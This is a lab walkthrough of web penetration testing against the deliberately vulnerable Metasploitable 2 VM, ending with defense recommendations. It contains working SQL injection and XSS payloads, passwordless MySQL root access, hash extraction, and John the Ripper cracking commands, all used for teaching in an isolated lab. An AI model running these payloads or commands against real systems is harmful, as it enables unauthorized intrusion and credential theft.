# 🔐 Web Penetration Testing — Metasploitable 2
> A structured learning walkthrough of web security testing using Metasploitable 2 as the target machine in an isolated lab environment.

⚠️ **Disclaimer:** This was performed in a controlled lab environment on an intentionally vulnerable VM (Metasploitable 2). Never perform these techniques on systems you do not own or have explicit permission to test.

---

## 🧪 Lab Setup

| Component | Details |
|-----------|---------|
| Attacker Machine | Kali Linux |
| Target Machine | Metasploitable 2 |
| Target IP | 192.168.0.106 |
| Network | Isolated VM Network |

---

## 📚 Table of Contents

1. [Ports & Services](#1-ports--services)
2. [Information Gathering](#2-information-gathering)
3. [Scanning](#3-scanning)
4. [Enumeration](#4-enumeration)
5. [Exploitation](#5-exploitation)
6. [Full Pentest Flow](#6-full-pentest-flow)
7. [Defense Recommendations](#7-defense-recommendations)

---

## 1. Ports & Services

### What is a Port?
A port is a communication endpoint on a system. Every service running on a machine listens on a specific port number.

### Common Ports to Know

| Port | Protocol | Service | Risk if Exposed |
|------|----------|---------|-----------------|
| 21 | TCP | FTP | Credential sniffing |
| 22 | TCP | SSH | Brute force attacks |
| 23 | TCP | Telnet | Plaintext communication |
| 80 | TCP | HTTP | Unencrypted web traffic |
| 443 | TCP | HTTPS | Encrypted web traffic |
| 3306 | TCP | MySQL | Database exposure |
| 8080 | TCP | HTTP-Proxy | Alternate web server |

### What We Found on Metasploitable 2

```
PORT     STATE   SERVICE    VERSION
80/tcp   open    http       Apache httpd 2.2.8 (Ubuntu) DAV/2
443/tcp  closed  https      Not configured
8080/tcp closed  http-proxy Not active
3306/tcp open    mysql      MySQL 5.0.51a
```

### Key Finding
Port 443 (HTTPS) was **closed** — meaning all web traffic runs over **unencrypted HTTP**. This is a critical vulnerability.

---

## 2. Information Gathering

Information gathering is the first phase of penetration testing. The goal is to collect as much information as possible about the target.

### Tools Used

| Tool | Purpose | Command |
|------|---------|---------|
| `nmap` | Port scanning & service detection | `nmap -sV -sC -p- <target>` |
| `curl` | HTTP request inspection | `curl -I <target>` |
| `ping` | Verify connectivity | `ping -c 4 <target>` |

### Nmap Scan

```bash
nmap -sV -p 80,443,8080 192.168.0.106 -sC
```

**Output:**
```
PORT     STATE  SERVICE    VERSION
80/tcp   open   http       Apache httpd 2.2.8 ((Ubuntu) DAV/2)
443/tcp  closed https
8080/tcp closed http-proxy
```

### HTTP Header Inspection with Curl

```bash
curl -I http://192.168.0.106
```

**Output:**
```
HTTP/1.1 200 OK
Server: Apache/2.2.8 (Ubuntu) DAV/2
X-Powered-By: PHP/5.2.4-2ubuntu5.10
Content-Type: text/html
```

### What Headers Revealed

| Header | Value | Risk |
|--------|-------|------|
| `Server` | Apache/2.2.8 | Outdated — many CVEs |
| `X-Powered-By` | PHP/5.2.4 | Outdated — vulnerable |
| Missing `X-Frame-Options` | Not set | Clickjacking possible |
| Missing `HSTS` | Not set | No HTTPS enforcement |

---

## 3. Scanning

Scanning goes deeper than information gathering — we actively probe the target for vulnerabilities.

### Tools Used

| Tool | Purpose | Command |
|------|---------|---------|
| `nikto` | Web vulnerability scanner | `nikto -h <target>` |
| `dirb` | Directory brute forcing | `dirb http://<target>` |
| `gobuster` | Faster directory brute forcing | `gobuster dir -u <target> -w <wordlist>` |

### Nikto Scan

```bash
nikto -h 192.168.0.106
```

**Key Findings:**

| Finding | Risk Level |
|---------|-----------|
| Apache 2.2.8 outdated (EOL) | 🔴 Critical |
| PHP/5.2.4 outdated | 🔴 Critical |
| HTTP TRACE method enabled (XST) | 🔴 Critical |
| phpinfo.php exposed | 🟠 High |
| No X-Frame-Options header | 🟠 High |
| No X-Content-Type-Options | 🟠 High |
| Directory indexing enabled | 🟠 High |
| WebDAV enabled | 🟠 High |

### HTTP TRACE Vulnerability Demo

```bash
curl -X TRACE http://192.168.0.106/
```

If the server echoes back the request — it is vulnerable to Cross Site Tracing (XST).

---

## 4. Enumeration

Enumeration is the process of extracting detailed information from discovered services.

### Tools Used

| Tool | Purpose |
|------|---------|
| `dirb` | Discover hidden directories |
| `mysql client` | Direct database enumeration |
| `hash-identifier` | Identify hash types |

### Directory Enumeration with Dirb

```bash
dirb http://192.168.0.106
```

**Discovered Paths:**

| Path | Status | Risk |
|------|--------|------|
| `/dav/` | ✅ Listable | 🔴 WebDAV file upload |
| `/phpMyAdmin/` | ✅ Open | 🔴 DB admin exposed |
| `/phpinfo.php` | ✅ Open | 🟠 System info leaked |
| `/dvwa/` | ✅ Open | 🟠 Vulnerable web app |
| `/mutillidae/` | ✅ Open | 🟠 Vulnerable web app |
| `/test/` | ✅ Listable | 🟡 Directory listing |
| `/twiki/` | ✅ Open | 🟠 Old wiki, known CVEs |

### MySQL Direct Enumeration

Since MySQL (port 3306) was open with no password:

```bash
mysql -h 192.168.0.106 -u root --ssl=0
```

**Databases Found:**
```sql
show databases;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| dvwa               |
| metasploit         |
| mysql              |
| owasp10            |
| tikiwiki           |
| tikiwiki195        |
+--------------------+
```

**MySQL Users:**
```sql
use mysql;
select user, password from user;

+------------------+----------+
| user             | password |
+------------------+----------+
| root             |          |
| guest            |          |
| debian-sys-maint |          |
+------------------+----------+
```

**Finding:** root user has **no password** — critical misconfiguration.

### Password Hash Extraction

```sql
use dvwa;
select user, password from users;

+---------+----------------------------------+
| user    | password                         |
+---------+----------------------------------+
| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 |
+---------+----------------------------------+
```

### Hash Identification

```bash
hash-identifier 5f4dcc3b5aa765d61d8327deb882cf99
```

**Result:** MD5 — a weak, unsalted hashing algorithm.

### Password Cracking with John the Ripper

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show --format=raw-md5 hashes.txt
```

**Cracked Passwords:**

| User | Password |
|------|----------|
| admin | password |
| gordonb | abc123 |
| pablo | letmein |
| 1337 | charley |
| smithy | password |

**All 5 passwords cracked in seconds** — proving MD5 without salting is completely insecure.

---

## 5. Exploitation

### 5.1 SQL Injection (DVWA)

SQL Injection allows an attacker to manipulate database queries through user input fields.

**Basic Injection — Return All Users:**
```
Input: 1' or '1'='1
```

The internal query becomes:
```sql
SELECT name, surname FROM users WHERE id='1' OR '1'='1';
```

Since `'1'='1'` is always true — all records are returned.

**UNION Based Injection — Extract DB Version:**
```
Input: 1' union select null,version()#
Result: 5.0.51a-3ubuntu5
```

**UNION Based Injection — Extract Database Name:**
```
Input: 1' union select null,database()#
Result: dvwa
```

---

### 5.2 XSS — Reflected

Reflected XSS executes malicious JavaScript that is immediately reflected back to the user.

```
Input: <script>alert('XSS')</script>
Result: Alert popup executed in browser
```

**Why dangerous:** Attacker can steal cookies, redirect users, or capture keystrokes.

---

### 5.3 XSS — Stored

Stored XSS saves the malicious script in the database — affecting every user who visits the page.

```
Name: test
Message: <script>alert('Stored XSS')</script>
```

| Reflected XSS | Stored XSS |
|--------------|------------|
| Affects only you | Affects all visitors |
| Not saved in DB | Saved in database |
| Less dangerous | 🔴 More dangerous |

---

### 5.4 File Upload

The file upload feature had no validation — any file type could be uploaded.

```
Result: ../../hackable/uploads/ftp.txt successfully uploaded!
```

**Risk:** An attacker could upload a malicious PHP shell and execute OS commands remotely.

---

### 5.5 HTTP Traffic Interception with Burp Suite

Burp Suite was configured as a proxy to intercept HTTP traffic.

```
POST /dvwa/login.php HTTP/1.1
Host: 192.168.0.106

username=admin&password=password&Login=Login
```

**Key Finding:** Since no HTTPS is used, credentials are transmitted in **plaintext** — visible to anyone on the network.

---

## 6. Full Pentest Flow

```
┌─────────────────────────────────────────────┐
│           PENETRATION TESTING FLOW          │
├─────────────────────────────────────────────┤
│                                             │
│  1. RECONNAISSANCE                          │
│     └── ping, nmap, curl -I                 │
│                                             │
│  2. SCANNING                                │
│     └── nikto, dirb, nmap -sV -sC          │
│                                             │
│  3. ENUMERATION                             │
│     └── mysql, hash-identifier, dirb        │
│                                             │
│  4. EXPLOITATION                            │
│     └── SQL injection, XSS, file upload    │
│                                             │
│  5. POST EXPLOITATION                       │
│     └── password cracking, data extraction │
│                                             │
│  6. REPORTING                               │
│     └── document findings & recommendations│
│                                             │
└─────────────────────────────────────────────┘
```

---

## 7. Defense Recommendations

| Vulnerability Found | Fix |
|--------------------|-----|
| No HTTPS | Install SSL certificate, force HTTP → HTTPS redirect |
| Apache 2.2.8 outdated | Upgrade to Apache 2.4.x |
| PHP 5.2.4 outdated | Upgrade to PHP 8.x |
| MySQL root no password | Set strong password for all DB users |
| MD5 password hashing | Use bcrypt or argon2 |
| SQL Injection | Use prepared statements and parameterized queries |
| XSS | Sanitize input, encode output, implement CSP headers |
| File Upload | Validate file type, store outside web root |
| Directory listing | Disable in Apache config |
| phpinfo.php exposed | Remove from production server |
| HTTP TRACE enabled | Add `TraceEnable Off` in Apache config |
| Missing security headers | Add X-Frame-Options, HSTS, CSP headers |

---

## 🛠️ Tools Summary

| Tool | Category | Purpose |
|------|----------|---------|
| `nmap` | Reconnaissance | Port scanning & service detection |
| `curl` | Reconnaissance | HTTP header inspection |
| `nikto` | Scanning | Web vulnerability scanning |
| `dirb` | Scanning | Directory enumeration |
| `mysql` | Enumeration | Direct database access |
| `hash-identifier` | Enumeration | Identify hash algorithms |
| `john` | Exploitation | Password hash cracking |
| `Burp Suite` | Exploitation | HTTP traffic interception |

---

## 📖 Key Takeaways

1. **HTTP is insecure** — all data including passwords travel in plaintext
2. **Outdated software** is a major attack vector — always patch and update
3. **Weak passwords** are cracked in seconds — enforce strong password policies
4. **MD5 hashing** is broken — use modern algorithms like bcrypt
5. **User input must always be sanitized** — prevents SQLi and XSS
6. **Least privilege principle** — never run database as root with no password
7. **Security headers matter** — they prevent clickjacking, XSS, and MIME attacks

---

*This lab was performed for educational purposes only in an isolated environment.*
